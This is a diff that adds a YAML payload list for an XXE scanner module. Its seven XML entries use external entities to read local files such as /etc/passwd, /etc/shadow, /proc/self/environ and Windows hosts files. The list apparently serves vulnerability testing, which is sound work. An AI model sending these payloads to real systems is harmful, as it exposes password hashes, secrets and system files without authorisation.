@@ -1,0 +1,26 @@
+# XML External Entity (XXE) payloads.
+# Each entry: payload XML, label (human-readable), and unix/win flag for signature matching.
+# Module: scanner/modules/xxe.py
+
+payloads:
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    label: "/etc/passwd read"
+    target: "unix"
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
+    label: "win.ini read"
+    target: "windows"
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>'
+    label: "/etc/passwd via parameter entity"
+    target: "unix"
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>'
+    label: "/etc/shadow read"
+    target: "unix"
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>'
+    label: "/proc/self/environ read"
+    target: "unix"
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>'
+    label: "/etc/hosts read"
+    target: "unix"
+  - payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>'
+    label: "Windows hosts file read"
+    target: "windows"
